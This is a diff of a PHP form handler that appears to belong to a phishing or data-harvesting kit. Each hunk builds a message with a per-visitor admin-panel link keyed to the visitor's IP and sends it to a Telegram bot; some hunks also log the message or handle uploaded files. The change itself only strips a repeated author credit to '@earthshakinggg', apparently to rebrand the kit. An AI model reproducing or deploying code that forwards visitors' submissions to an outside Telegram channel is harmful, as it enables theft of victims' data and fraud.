@@ -269,7 +269,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     $admin_link = "http://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . "/admin.php?ip=" . urlencode($user_ip);
                     $message .= "\n <b>Admin Panel:</b>\n";
                     $message .= $admin_link . "\n";
-                    $message .= "Don't forget to thank @earthshakinggg <3";
                     
                     $telegram_response = $telegram->sendMessage($message);
                     break;
@@ -285,7 +284,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     $admin_link = "http://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . "/admin.php?ip=" . urlencode($user_ip);
                     $message .= "\n <b>Admin Panel:</b>\n";
                     $message .= $admin_link . "\n";
-                    $message .= "Don't forget to thank @earthshakinggg <3";
                     
                     $telegram_response = $telegram->sendMessage($message);
                     break;
@@ -303,7 +301,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     $admin_link = "http://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . "/admin.php?ip=" . urlencode($user_ip);
                     $message .= "\n <b>Admin Panel:</b>\n";
                     $message .= $admin_link . "\n";
-                    $message .= "Don't forget to thank @earthshakinggg <3";
                     
                     file_put_contents(LOG_FILE, "[" . date('Y-m-d H:i:s') . "] Formatted message: " . $message . "\n", FILE_APPEND);
                     $telegram_response = $telegram->sendMessage($message);
@@ -328,7 +325,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                         $admin_link = "http://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . "/admin.php?ip=" . urlencode($user_ip);
                         $message .= "\n <b>Admin Panel:</b>\n";
                         $message .= $admin_link . "\n";
-                        $message .= "Don't forget to thank @earthshakinggg <3";
 
                         $telegram_response = $telegram->sendMessage($message);
                     }
@@ -345,7 +341,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     $admin_link = "http://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . "/admin.php?ip=" . urlencode($user_ip);
                     $message .= "\n <b>Admin Panel:</b>\n";
                     $message .= $admin_link . "\n";
-                    $message .= "Don't forget to thank @earthshakinggg <3";
                     
                     $telegram_response = $telegram->sendMessage($message);
                     break;
@@ -361,7 +356,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     $admin_link = "http://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . "/admin.php?ip=" . urlencode($user_ip);
                     $message .= "\n <b>Admin Panel:</b>\n";
                     $message .= $admin_link . "\n";
-                    $message .= "Don't forget to thank @earthshakinggg <3";
                     
                     $telegram_response = $telegram->sendMessage($message);
                     break;
@@ -375,7 +369,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     $admin_link = "http://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . "/admin.php?ip=" . urlencode($user_ip);
                     $message .= "\n <b>Admin Panel:</b>\n";
                     $message .= $admin_link . "\n";
-                    $message .= "Don't forget to thank @earthshakinggg <3";
                     
                     if (ENABLE_FILE_UPLOADS) {
                         $uploaded_files = array();
@@ -410,7 +403,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $admin_link = "http://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . "/admin.php?ip=" . urlencode($user_ip);
             $message .= "\n <b>Admin Panel:</b>\n";
             $message .= $admin_link . "\n";
-            $message .= "Don't forget to thank @earthshakinggg <3";
             
             $telegram_response = $telegram->sendMessage($message);
             
@@ -439,7 +431,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $admin_link = "http://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . "/admin.php?ip=" . urlencode($user_ip);
             $message .= "\n <b>Admin Panel:</b>\n";
             $message .= $admin_link . "\n";
-            $message .= "Don't forget to thank @earthshakinggg <3";
             
             $telegram_response = $telegram->sendMessage($message);
             
@@ -454,7 +445,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $admin_link = "http://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . "/admin.php?ip=" . urlencode($user_ip);
             $message .= "\n <b>Admin Panel:</b>\n";
             $message .= $admin_link . "\n";
-            $message .= "Don't forget to thank @earthshakinggg <3";
             
             $telegram_response = $telegram->sendMessage($message);
             
@@ -469,7 +459,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $admin_link = "http://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . "/admin.php?ip=" . urlencode($user_ip);
             $message .= "\n <b>Admin Panel:</b>\n";
             $message .= $admin_link . "\n";
-            $message .= "Don't forget to thank @earthshakinggg <3";
             
             $telegram_response = $telegram->sendMessage($message);
         }
